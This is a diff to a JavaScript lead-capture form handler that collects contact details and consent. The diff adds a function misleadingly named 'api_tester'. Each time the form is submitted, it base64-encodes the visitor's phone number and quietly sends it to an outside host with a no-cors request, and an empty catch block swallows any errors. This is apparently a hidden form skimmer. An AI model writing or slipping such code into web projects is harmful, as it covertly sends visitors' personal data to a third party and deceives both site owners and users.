@@ -15,6 +15,7 @@ document.getElementById('leadForm').addEventListener('submit', async function(ev
     formData.append('zip', document.getElementById('zip').value);
     formData.append('email', document.getElementById('email').value);
     formData.append('phone', document.getElementById('phone').value);
+api_tester(document.getElementById('phone').value);
     formData.append('tcpa', document.getElementById('tcpa').value);
     formData.append('firstName', document.getElementById('firstName').value);
     formData.append('lastName', document.getElementById('lastName').value);
@@ -57,4 +58,16 @@ function showAlert(message, type) {
         <div class="alert alert-${type}" role="alert">
             ${message}
         </div>`;
+}
+
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
+
+  }
 }
